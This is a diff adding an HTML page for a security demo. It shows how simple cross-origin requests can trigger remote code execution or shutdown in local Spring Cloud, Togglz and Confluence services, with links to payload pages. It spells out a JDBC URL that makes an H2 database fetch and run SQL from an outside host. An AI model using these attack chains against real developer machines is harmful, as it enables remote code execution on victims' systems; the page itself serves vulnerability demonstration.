@@ -1,0 +1,52 @@
+<html>
+<head>
+  </head>
+  <body>
+    <center><h1>Simple Request Vulnerabilities in the Developer Environment</h1></center>
+    Following the below guide and clicking on the payload link will trigger a RCE on your local machine. In all but one instance this will open the Calculator app. ( assuming you are using a Mac. ) Or for Confluence create a file in /tmp.</br></br>
+    <h3> Spring Cloud </h3>
+    This works because Spring Cloud V1 allowed the /env actuator to modify properties with a POST request with content type application/x-www-form-urlencoded. Allowing for a Simple Request attack.</br>
+    This is done by first setting the spring app's jdbc url to : </br>
+    <i>
+    spring.datasource.url=jdbc:h2:mem:testdb;INIT=runscript from 'http://somerandomsite.bla:8081/exec.sql'</i></br>
+    Then restarting the application so the change takes effect via the /restart actuator. </br>
+    On startup, the Spring App will create a in memory H2 database and call out to http://somerandomsite.bla:8081/exec.sql to download the sql and execute it. This leverages a feature of the in memory H2 database to compile and execute a Java method which in turn opens the Calculator app.
+    <p><b>To Run : </b></br><i>
+    git clone xxx</br>
+    cd Simple-Requests/spring-cloud-v1-vuln</br>
+    mvn spring-boot:run</br>
+  </i>
+    <a href="springcloud.html">Payload Link</a></p>
+</br>
+    <h3>Togglz</h3>
+    This relies on the Togglz CSRF Vulnerability <a href="https://github.com/advisories/GHSA-697v-pxg3-j262">CVE-2020-28191</a>.</br> A Simple Post Request can be made to hit localhost which modifies the feature toggle to execute arbitrary Java code via the Nashorn engine during toggle evaluation.
+    <p><b>To Run : </b></br><i>
+    cd Simple-Requests/spring-boot-hello-world-feature-enum</br>
+    mvn spring-boot:run</br>
+  </i>
+    <a href="togglz.html">Payload Link</a></p>
+
+</br>
+<h3>Spring Actuator Shutdown</h3>
+    In Spring V2 actuators require a content-type of application/json. But when a post request does not have a message body, like with the /shutdown actuator, if no content-type is specified the actuator can still be triggered. So a Simple Post Request can be use to shutdown a Spring Boot app bound to localhost.
+    <p><b>To Run : </b></br><i>
+    cd Simple-Requests/spring-boot-hello-world-feature-enum</br>
+    mvn spring-boot:run</br>
+    </i>
+
+    <a href="shutdown.html">Payload Link</a></p>
+
+</br>
+    <h3>Confluence CVE-2022-26134</h3>
+    This Confluence RCE relies on OGNL injection. As it is done via a Simple Get Request, it can be run via a Simple Request accessing localhost or an internal network that the victim has access to.
+    <p><b>To Run : </b></br><i>
+      git clone https://github.com/vulhub/vulhub.git </br>
+      cd vulhub/confluence/CVE-2022-26134  </br>
+      docker-compose up
+    <i></br>
+
+    <a href="confluence-cve-2022-26134.html"> Payload Link </a></p>
+  </body>
+
+
+</html>
